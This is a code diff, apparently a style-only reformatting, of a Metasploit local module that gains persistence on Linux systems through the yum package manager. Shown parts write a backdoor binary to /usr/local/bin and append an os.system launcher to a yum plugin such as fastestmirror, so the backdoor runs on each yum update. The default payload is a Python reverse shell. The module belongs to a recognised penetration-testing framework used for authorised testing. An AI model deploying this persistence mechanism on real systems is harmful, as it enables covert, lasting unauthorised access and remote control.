@@ -11,20 +11,21 @@ class MetasploitModule < Msf::Exploit::Local
   include Msf::Post::Linux::System
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Yum Package Manager Persistence',
-      'Description'    => %q(
-        This module will run a payload when the package manager is used. No
-        handler is ran automatically so you must configure an appropriate
-        exploit/multi/handler to connect. Module modifies a yum plugin to
-        launch a binary of choice. grep -F 'enabled=1' /etc/yum/pluginconf.d/
-        will show what plugins are currently enabled on the system.
-      ),
-      'License'        => MSF_LICENSE,
-      'Author'         => ['Aaron Ringo'],
-      'Platform'       => ['linux', 'unix'],
-      'Arch'           =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Yum Package Manager Persistence',
+        'Description' => %q{
+          This module will run a payload when the package manager is used. No
+          handler is ran automatically so you must configure an appropriate
+          exploit/multi/handler to connect. Module modifies a yum plugin to
+          launch a binary of choice. grep -F 'enabled=1' /etc/yum/pluginconf.d/
+          will show what plugins are currently enabled on the system.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => ['Aaron Ringo'],
+        'Platform' => ['linux', 'unix'],
+        'Arch' => [
           ARCH_CMD,
           ARCH_X86,
           ARCH_X64,
@@ -34,29 +35,32 @@ class MetasploitModule < Msf::Exploit::Local
           ARCH_MIPSLE,
           ARCH_MIPSBE
         ],
-      'SessionTypes'   => ['shell', 'meterpreter'],
-      'DefaultOptions' => {
-                            'WfsDelay' => 0, 'DisablePayloadHandler' => true,
-                            'Payload'  => 'cmd/unix/reverse_python'
-                          },
-      'DisclosureDate' => '2003-12-17', # Date published, Robert G. Browns documentation on Yum
-      'References'     => ['URL', 'https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/deployment_guide/sec-yum_plugins'],
-      'Targets'        => [['Automatic', {}]],
-      'DefaultTarget'  => 0
-    ))
+        'SessionTypes' => ['shell', 'meterpreter'],
+        'DefaultOptions' => {
+          'WfsDelay' => 0, 'DisablePayloadHandler' => true,
+          'Payload' => 'cmd/unix/reverse_python'
+        },
+        'DisclosureDate' => '2003-12-17', # Date published, Robert G. Browns documentation on Yum
+        'References' => ['URL', 'https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/deployment_guide/sec-yum_plugins'],
+        'Targets' => [['Automatic', {}]],
+        'DefaultTarget' => 0
+      )
+    )
 
     register_options(
       [
         # /usr/lib/yum-plugins/fastestmirror.py is a default enabled plugin in centos
         OptString.new('PLUGIN', [true, 'Yum Plugin to target', 'fastestmirror']),
         OptString.new('BACKDOOR_NAME', [false, 'Name of binary to write'])
-      ])
+      ]
+    )
 
     register_advanced_options(
       [
         OptString.new('WritableDir', [true, 'A directory where we can write files', '/usr/local/bin/']),
         OptString.new('PluginPath', [true, 'Plugin Path to use', '/usr/lib/yum-plugins/'])
-      ])
+      ]
+    )
   end
 
   def exploit
@@ -105,7 +109,7 @@ class MetasploitModule < Msf::Exploit::Local
     # check for sed binary and then append launcher to plugin underneath
     print_status('Attempting to modify plugin')
     launcher = "os.system('setsid #{backdoor_path} 2>/dev/null \\& ')"
-    sed_path = cmd_exec "command -v sed"
+    sed_path = cmd_exec 'command -v sed'
     unless sed_path.include?('sed')
       fail_with Failure::NotVulnerable, 'Module uses sed to modify plugin, sed was not found'
     end
@@ -123,7 +127,7 @@ class MetasploitModule < Msf::Exploit::Local
     end
 
     # change perms to reflect bins in /usr/local/bin/, give good feels
-    chmod(backdoor_path, 0755)
+    chmod(backdoor_path, 0o755)
     print_status("Backdoor uploaded to #{backdoor_path}")
     print_status('Backdoor will run on next Yum update')
   end
